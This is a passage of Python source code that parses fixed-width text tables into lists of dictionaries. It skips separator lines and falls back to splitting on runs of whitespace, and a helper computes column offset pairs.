    parsed: list[dict[str, str]] = []
    for row in rows:
        if re.match(r"^[=-]{3,}", row):
            continue
        values = [row[s:e].strip() for s, e in _pairs(col_positions, len(row))]
        if len(values) != len(columns):
            parts = re.split(r"\s{2,}", row.strip())
            if len(parts) == len(columns):
                values = parts
            else:
                continue
        parsed.append(dict(zip(columns, values, strict=False)))
    return parsed


def _pairs(starts: list[int], line_len: int) -> list[tuple[int, int]]:
    pairs: list[tuple[int, int]] = []
    for i, s in enumerate(starts):
        e = starts[i + 1] if i + 1 < len(starts) else line_len
        pairs.append((s, e))
    return pairs
